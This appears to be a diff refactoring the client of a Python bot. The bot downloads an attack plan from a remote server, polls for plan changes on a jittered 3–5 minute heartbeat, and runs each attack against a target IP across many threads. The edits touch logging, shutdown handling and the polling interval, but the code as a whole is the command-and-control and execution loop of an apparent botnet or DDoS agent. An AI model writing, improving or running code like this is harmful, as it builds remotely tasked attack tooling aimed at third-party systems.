@@ -51,9 +51,10 @@ class Bot:
     # --------------------------------------------------------------------- #
 
     def __init__(self, cfg: BotConfig) -> None:
-        self.cfg   = cfg
-        self.log   = self._make_logger()
-        self.hash: str | None = None  # updated after first fetch
+        self.cfg       = cfg
+        self.logger    = self._make_logger()
+        self.plan_hash = ""              # filled after first download
+        self.stop_evt  = threading.Event()
 
     # ------------------------------- public -------------------------------- #
     def run(self) -> None:
@@ -62,19 +63,23 @@ class Bot:
             plan_json          = self._fetch_plan()
             self.plan_hash     = Plan.sha256_json(plan_json)
 
-            # launch heartbeat before first execution so hash stays current
-            threading.Thread(target=self._heartbeat_loop,
-                             name="Heartbeat",
-                             daemon=True).start()
+            # heartbeat keeps the plan up to date
+            hb = threading.Thread(target=self._heartbeat_loop, name="Heartbeat",daemon=True,)
+            hb.start()
 
             self._execute_plan(Plan.from_json(plan_json))
 
-            # idle forever – heartbeat thread keeps the process alive
-            while True:
-                time.sleep(3600)
+            # idle until Ctrl-C
+            while not self.stop_evt.is_set():
+                time.sleep(1)
+
+        except KeyboardInterrupt:
+            self.logger.info("CTRL-C received - shutting down")
         except Exception as exc:
-            self.log.error("Fatal error: %s", exc)
-            sys.exit(1)
+            self.logger.error("Fatal error: %s", exc)
+        finally:
+            self.stop_evt.set()          # stop heartbeat ASAP
+            sys.exit(0)
 
     # ------------------------- internals ----------------------------------- #
     def _make_logger(self) -> DetailedLogger:
@@ -102,38 +107,38 @@ class Bot:
 
     # --------------------------------------------------------------------- #
     def _heartbeat_loop(self) -> None:
-        self.log.debug("Heartbeat thread started")
-        while True:
-            time.sleep(random.randint(1, 2))# 3–5 min jitter
+        self.logger.debug("Heartbeat thread started")
+        while not self.stop_evt.is_set():
+            interval = random.randint(180, 300)   # 3–5 min
+            if self.stop_evt.wait(interval):
+                break                             # stop requested
             try:
                 new_hash = self._fetch_plan_hash()
                 if new_hash != self.plan_hash:
-                    self.log.info("Plan hash changed - downloading update")
-                    plan_json      = self._fetch_plan()
-                    self.plan_hash = Plan.sha256_json(plan_json)
-                    self._execute_plan(Plan.from_json(plan_json))
+                    self.logger.info("Plan changed - downloading update")
+                    raw = self._fetch_plan()
+                    self.plan_hash = Plan.sha256_json(raw)
+                    self._execute_plan(Plan.from_json(raw))
                 else:
-                    self.log.debug("Plan unchanged")
+                    self.logger.debug("Plan unchanged")
             except Exception as exc:
-                self.log.error("Heartbeat failed: %s", exc)
+                self.logger.error("Heartbeat failed: %s", exc)
 
     # --------------------------------------------------------------------- #
     def _execute_plan(self, plan: Plan) -> None:
             """Run each attack in order"""
             for atk in plan.attack_objs:
-                workers: List[threading.Thread] = []
-
+                self.logger.info("Starting %s on %s with %d thread(s)",type(atk).__name__,atk.target_ip,atk.threads,)
+                workers: list[threading.Thread] = []
                 def _worker() -> None:
                     try:
                         atk.wait_until_start()
                         if self.cfg.debug:
-                            print(f"Executing on {atk.target_ip} | "f"{type(atk).__name__} | {atk.parameters}",flush=True)
+                            print(f"Executin on {atk.target_ip} | "f"{type(atk).__name__} | {atk.parameters}",flush=True,)
                         atk.execute()
-                        self.log.info("Worker finished %s on %s",type(atk).__name__, atk.target_ip)
+                        self.logger.info("Finished %s on %s", type(atk).__name__, atk.target_ip)
                     except Exception as exc:
-                        self.log.error("Worker error for %s on %s: %s",type(atk).__name__, atk.target_ip, exc)
-
-                self.log.info("Starting %s on %s with %d thread(s)",type(atk).__name__, atk.target_ip, atk.threads)
+                        self.logger.error("Worker error for %s on %s: %s",type(atk).__name__,atk.target_ip,exc,)
 
                 for _ in range(atk.threads):
                     t = threading.Thread(target=_worker, daemon=True)
@@ -143,9 +148,10 @@ class Bot:
                 for t in workers:
                     t.join()
 
-                self.log.info("Attack %s on %s completed",type(atk).__name__, atk.target_ip)
+                self.logger.info("Attack %s on %s completed", type(atk).__name__, atk.target_ip)
+
             if self.cfg.debug:
-                print("All attacks completed",flush=True)
+                print("All attacks finished", flush=True)
 
     # --------------------------------------------------------------------- #
     # CLI                                                                   #
@@ -164,9 +170,5 @@ class Bot:
 # Script entry-point                                                          #
 # --------------------------------------------------------------------------- #
 if __name__ == "__main__":
-    try:
-        config = Bot.parse_cli(sys.argv[1:])
-        Bot(config).run()
-    except KeyboardInterrupt:
-        DetailedLogger().critical("Bot interrupted by user (Ctrl-C) – exiting")
-        sys.exit(1)
+    config = Bot.parse_cli(sys.argv[1:])
+    Bot(config).run()
